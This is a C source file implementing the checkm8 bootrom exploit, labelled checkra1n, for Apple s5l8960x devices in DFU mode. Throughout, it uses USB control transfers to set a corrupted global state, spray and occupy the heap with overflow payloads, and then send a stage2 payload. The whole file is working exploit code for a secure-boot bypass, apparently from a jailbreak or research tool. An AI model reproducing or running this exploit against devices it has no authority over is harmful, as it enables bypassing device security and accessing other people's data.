
#include <iousb.h>
#include <checkra1n_common.h>

static unsigned char blank[2048]; // 00000000...
static unsigned char AAAA[2048];  // 41414141...

// log
static int empty(void){
    return 0;
}

#ifdef HAVE_DEBUG
#define DEBUG_(...) printf(__VA_ARGS__)
#else
#define DEBUG_(...) empty()
#endif

static void heap_spray(io_client_t client){
    IOReturn r;
    r = usb_ctrl_transfer_with_time(client, 2, 3, 0x0000, 128, NULL, 0, 10);
    usleep(100000);
    
    r = usb_ctrl_transfer_with_time(client, 0x80, 6, 0x0304, 0x040a, blank, 65, 1);
    usleep(10000);
    
    for(int i=0;i<7938;i++){
        r = usb_ctrl_transfer_with_time(client, 0x80, 6, 0x0304, 0x040a, blank, 64, 1);
    }
    usleep(10000);
    
    r = usb_ctrl_transfer_with_time(client, 0x80, 6, 0x0304, 0x040a, blank, 65, 1);
    
}

static void set_global_state(io_client_t client){
    IOReturn r;
    unsigned int val;
    unsigned int sent;
    
    val = 1408; // t8010 & t8015 & s5l8960x
    
    /* val haxx
     * If async_transfer() sent = 0x40, then val = 1408. And, it is possible to try again a few times and wait until sent = 0x40
     * However, even if sent != 0x40, it succeeds by subtracting the value from val.
     * To reduce the number of attempts, It decided to use subtraction unless sent is greater than val.
     */
    
    int i=0;
    while((sent = async_usb_ctrl_transfer_with_cancel(client, 0x21, 1, 0x0000, 0x0000, AAAA, 2048, 0)) >= val){
        i++;
        DEBUG_("%x\n", i);
        usleep(10000);
        r = usb_ctrl_transfer(client, 0x21, 1, 0x0000, 0x0000, AAAA, 64);
        usleep(10000);
    }
    
    val += 0x40;
    val -= sent;
    
    r = usb_ctrl_transfer_with_time(client, 0, 0, 0x0000, 0x0000, AAAA, val, 100);
    
    heap_spray(client);
    
    r = usb_ctrl_transfer_with_time(client, 0x21, 4, 0x0000, 0x0000, NULL, 0, 0);
    
}


unsigned char yolo[] = {
    0x79, 0x6f, 0x6c, 0x6f
};

static void heap_occupation(io_client_t client, uint16_t cpid, checkra1n_payload_t payload){
    IOReturn r;
    
    r = usb_ctrl_transfer_with_time(client, 2, 3, 0x0000, 128, NULL, 0, 10);
    usleep(10000);
    
    for(int i=0;i<3;i++){
        r = usb_ctrl_transfer_with_time(client, 0x80, 6, 0x0304, 0x040a, blank, 64, 1);
    }
    usleep(10000);
    
    r = usb_ctrl_transfer_with_time(client, 0, 0, 0x0000, 0x0000, payload.over1, payload.over1_len, 100);
    
    r = usb_ctrl_transfer_with_time(client, 0x21, 1, 0x0000, 0x0000, yolo, 4, 100);
    
    r = usb_ctrl_transfer_with_time(client, 0x21, 1, 0x0000, 0x0000, payload.over2, payload.over2_len, 100);
    
    //r = usb_ctrl_transfer_with_time(client, 0x21, 4, 0x0000, 0x0000, NULL, 0, 0);
}

int checkra1n_s5l8960x(io_client_t client, uint16_t cpid, checkra1n_payload_t payload){
    int r;
    
    bzero(blank, 2048);
    memset(AAAA, 'A', 2048);
    
    LOG_EXPLOIT_NAME("checkm8");
    
    LOG_DEBUG("reconnect");
    io_reset(client);
    io_close(client);
    client = NULL;
    usleep(10000);
    get_device_time_stage(&client, 5, DEVICE_DFU);
    if(!client) {
        LOG_ERROR("ERROR: Failed to reconnect to device");
        return -1;
    }

    LOG_DEBUG("[checkra1n] running set_global_state()");
    set_global_state(client);
    
    LOG_DEBUG("reconnect");
    io_reset(client);
    io_close(client);
    client = NULL;
    usleep(10000);
    get_device_time_stage(&client, 5, DEVICE_DFU);
    if(!client) {
        LOG_ERROR("ERROR: Failed to reconnect to device");
        return -1;
    }
    
    LOG_DEBUG("[checkra1n] running heap_occupation()");
    heap_occupation(client, cpid, payload);
    
    LOG_DEBUG("reconnect");
    (*client->handle)->USBDeviceReEnumerate(client->handle, 0);
    io_close(client);
    client = NULL;
    usleep(10000);
    get_device_time_stage(&client, 5, DEVICE_DFU);
    if(!client) {
        LOG_ERROR("ERROR: Failed to reconnect to device");
        return -1;
    }
    
    LOG_DEBUG("[checkra1n] sending stage2 payload");
    payload_stage2(client, cpid, payload);
    
    connect_to_stage2(client, cpid, payload);
    
    return 0;
}
